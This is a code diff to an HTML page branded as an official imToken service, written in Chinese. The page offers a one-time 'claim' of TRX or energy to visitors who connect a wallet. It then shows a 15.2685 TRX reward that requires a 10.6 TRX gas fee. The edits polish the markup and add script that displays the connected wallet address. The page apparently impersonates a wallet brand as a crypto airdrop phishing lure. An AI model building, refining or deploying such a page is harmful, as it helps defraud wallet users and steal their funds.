@@ -251,7 +251,7 @@
         <!-- 头部 -->
         <div class="header">   
             <h1>imToken</h1>
-            <p class="desc"><strong>imToken</strong>strong>官方专属服务每个钱包地址只可领取一次，重复领取无限</p>
+            <p class="desc"><strong>imToken</strong>官方专属服务每个钱包地址只可领取一次，重复领取无限</p>
         </div>   
         <!-- 用户信息卡 -->
         <div id="userInfo">
@@ -263,7 +263,7 @@
             <div class="status-title"> 钱包状态</div>
             <!-- 未连接钱包时显示 -->
             <div class="disconnected-content">
-                <p><span>未连接钱包</span></p>
+                <span>未连接钱包</span>
                 <p><span>您现在准备领取的是imToken专属项目，非imToken用户不可领取</span></p>
                 <p><span>1. 每个钱包地址只可领取一次</span></p>         
                 <p><span>2.随机发放能量或者TRX代币 </span></p>
@@ -274,9 +274,9 @@
             <div class="connected-content">
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p>• 领取类型：<span>TRX</span></p>
-                <p>• 领取额度：<span>15.2685</span></p>
-                <p>• 需消耗Gas费：<span>10.6TRX</span></p>
+                <p>• 领取类型：</p><strong>TRX</strong>
+                <p>• 领取额度：<strong>15.2685</strong></p>
+                <p>• 需消耗Gas费：<strong>10.6TRX</strong></p>
                 <p>提示：请确保足够的TRX余额，先择放弃直接退出即可二次登入不会改变领取的类型和额度</p>
 
             </div>
@@ -479,7 +479,8 @@
             if (userAddress) {
                 // 已连接：添加connected类，显示连接后内容
                 walletStatusContainer.classList.add("connected");
-              
+               document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+
             } else {
                 // 未连接：移除connected类，显示未连接内容
                 walletStatusContainer.classList.remove("connected");
